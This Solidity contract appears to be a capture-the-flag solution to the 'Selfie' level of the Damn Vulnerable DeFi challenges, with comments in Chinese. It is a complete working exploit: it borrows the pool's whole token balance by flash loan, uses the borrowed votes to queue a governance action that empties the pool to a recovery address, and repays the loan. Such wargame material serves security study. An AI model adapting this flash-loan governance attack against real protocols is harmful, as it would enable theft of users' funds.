// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";
import {DamnValuableVotes} from "../DamnValuableVotes.sol";
import {SimpleGovernance} from "./SimpleGovernance.sol";
import {SelfiePool} from "./SelfiePool.sol";

contract SelfieAttack is IERC3156FlashBorrower {
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
    
    SelfiePool private immutable pool;
    SimpleGovernance private immutable governance;
    DamnValuableVotes private immutable token;
    address private immutable recovery;
    
    uint256 public actionId;
    
    constructor(SelfiePool _pool, SimpleGovernance _governance, DamnValuableVotes _token, address _recovery) {
        pool = _pool;
        governance = _governance;
        token = _token;
        recovery = _recovery;
    }
    
    function attack() external {
        // 借出池中所有代币
        uint256 amount = token.balanceOf(address(pool));
        pool.flashLoan(this, address(token), amount, "");
    }
    
    function onFlashLoan(
        address initiator,
        address asset,
        uint256 amount,
        uint256 /*fee*/,
        bytes calldata /*data*/
    ) external returns (bytes32) {
        // 确保调用者是池合约
        require(msg.sender == address(pool), "Caller must be pool");
        require(initiator == address(this), "Initiator must be this contract");
        require(asset == address(token), "Asset must be DVV token");
        
        // 将代币委托给自己以获得投票权
        token.delegate(address(this));
        
        // 编码emergencyExit调用数据
        bytes memory emergencyExitData = abi.encodeWithSignature(
            "emergencyExit(address)", 
            recovery
        );
        
        // 提交治理提案
        actionId = governance.queueAction(
            address(pool),  // target: SelfiePool合约
            0,              // value: 0 ETH
            emergencyExitData // data: emergencyExit调用数据
        );
        
        // 授权池合约转移代币以偿还闪电贷
        token.approve(address(pool), amount);
        
        return CALLBACK_SUCCESS;
    }
    
    function executeAction() external {
        governance.executeAction(actionId);
    }
} 